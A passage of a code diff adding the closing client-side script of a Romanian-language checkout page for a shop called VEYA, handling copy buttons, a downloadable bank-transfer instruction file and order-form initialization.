+    $('submit-label').textContent = method === 'gift_card' ? 'Trimite comanda' : 'Trimite comanda · Transfer bancar';
+  }
+});
+for (const button of document.querySelectorAll('[data-copy]')) button.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText($(button.dataset.copy).textContent);
+    $('copy-status').textContent = 'Copiat în clipboard.';
+  } catch { $('copy-status').textContent = 'Selectează și copiază textul manual.'; }
+});
+$('download').addEventListener('click', () => {
+  const content = ['VEYA · Instrucțiuni de transfer', 'Order ID: ' + orderId,
+    'Beneficiar: VEYA', 'Banca: ING Bank', 'IBAN: RO79INGB0000999920561840',
+    'Referință: ' + bankReference, 'Sumă: 799.90 RON', $('transfer-note').textContent].join('\n');
+  const url = URL.createObjectURL(new Blob([content], { type: 'text/plain;charset=utf-8' }));
+  const link = document.createElement('a');
+  link.href = url; link.download = 'veya-' + orderId + '.txt';
+  link.click(); setTimeout(() => URL.revokeObjectURL(url), 1000);
+});
+window.addEventListener('pageshow', event => {
+  // Reload a restored document so an old in-flight request cannot update a new order.
+  if (event.persisted) window.location.reload();
+});
+initializeOrder();
+syncAddress();
+syncMethod();
+$('submit').disabled = false;
+
+</script>
+</body></html>
